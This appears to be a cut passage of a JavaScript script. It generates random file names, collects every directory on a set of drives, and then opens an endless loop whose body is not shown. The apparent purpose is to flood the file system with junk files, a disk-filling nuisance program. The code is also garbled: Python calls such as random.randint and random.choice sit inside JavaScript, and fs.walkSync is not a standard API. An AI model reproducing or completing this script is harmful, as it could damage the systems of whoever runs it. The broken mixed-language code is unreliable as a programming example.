];

function randomFileName() {
    let dirNameLength = random.randint(2, 15);
    let fileName = "";
    for (let i = 0; i < dirNameLength; i++) {
        fileName += random.choice(characters);
    }
    return fileName;
}

function searchAllDirs() {
    const allDirs = [];
    for (let i = 0; i < paths.length; i++) {
        try {
            const drivePath = paths[i];
            const walker = fs.walkSync(drivePath);
            for (const dir of walker.dirs) {
                const dirPath = path.join(walker.root, dir);
                allDirs.push(dirPath);
            }
        } catch (error) {
            // Ignore if the path is not found
        }
    }
    return allDirs;
}

const allDirectories = searchAllDirs();

while (true) {
